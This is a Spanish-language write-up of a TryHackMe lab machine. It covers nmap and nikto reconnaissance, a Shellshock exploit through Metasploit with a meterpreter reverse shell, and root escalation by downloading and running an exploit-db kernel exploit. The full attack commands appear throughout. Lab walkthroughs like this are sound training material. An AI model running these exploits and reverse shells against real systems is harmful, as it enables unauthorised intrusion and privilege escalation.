Bienvenidos a otra sala de TryHackMe. Tenemos una maquina de dificultad media, en el que habra muchas trampas y directorios que no nos llevaran a ninguna parte. Realizamos una busqueda con nikto que nos muestra una vulnerabilidad en el sistema. Utilizamos `metasploit` para acceder al sistema para luego enumerar el sistema y escalar privilegios abusandonos de la version de la maquina.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-06 02:59:14 EDT for 23s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra dos puertos. Podemos hacer una enumeracion a directorios ocultos pero hay muchas trampas en el camino. Asique, mostrare la forma en la que se debe hacer correcta saltandonos este paso. SI queres, podes hacer una enumeracion completa, ver todas las rutas que marean y nos desvian.
Utilizamos nikto para hacer un reconocimiento de posibles vulnerabilidades dentro del servidor web. Puede demorar algunos minutos hasta que encuentre lo que buscamos.

```bash
nikto -h IPTARGET

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.196.5
+ Target Hostname:    10.10.196.5
+ Target Port:        80
+ Start Time:         2023-07-06 03:26:48 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192 
+ The anti-clickjacking X-Frame-Options header is not present.
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin-cvename.cgi?name=CVE-2014-6278)
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
```


# Intrusion

Anteriormente, nuestra enumeracion de nikto nos dio como resultado que es vulnerable a shellshock, y tenemos una ruta donde podemos lanzarlo usando **Metasploit**.

Abrimos Metasploit buscamos por `shellshock`. Utilizamos el resultado # 1 y modificiamos todas las opciones de la siguiente manera.

```bash
# Buscamos y seleccionamos el exploit
msfconsole
search shellshock
use 1 "exploit/multi/http/apache_mod..."

# Seleccionamos payload
Set payload linux/x86/meterpreter/reverse_tcp

# Modificamos las opciones
RHOSTS: 'TARGETIP'
TARGETURI: '/cgi-bin/test.cgi'
LHOST: 'LocalHost'
LPORT: 'LocalPort'

# Ejecutamos
exploit
```

# Priv.Escalation

Tenemos nuestra sesion de meterpreter, upgradeamos nuestra shell para poder trabajar mas comodo. Tipeamos `shell` y se nos abrira una sesion, no nos muestra ninguna interfaz, asique ejecutamos `python3 -c 'import pty;pty.spawn("/bin/bash")'` para upgradear nuestra shell. 

Realizamos una enumeracion del sistema buscando posibles permisos para escalar privilegios. Para esta escalada de privilegios, enumeraremos la version del sistema y buscaremos el exploit correspondiente para escalar a usuario raiz root.
Luego, nos descargamos el exploit a nuestra maquina atacante y lo transferimos al sistema para darle permisos de ejecucion y escalar root automatizando esta parte.

```bash
# Buscamos la version del sistema 
uname -a 'Linux ubuntu 3.13.0-32-generic...'

#Buscamos el exploit por internet
"https://www.exploit-db.com/exploits/37292"

#Lo descargamos a nuestra maquina atacante y abrimos un servidor python http
python3 -m http.server 8080

#Desde la maquina victima, nos dirigimos a /dev/shm y nos transferimos el exploit
cd /dev/shm
wget http://IPTARGET:8080/37292.c

# Compilamos el archivo con gcc a ofs, ya que es un lenguaje C y lo ejecutamos
gcc 37292.c -o ofs
./ofs

```
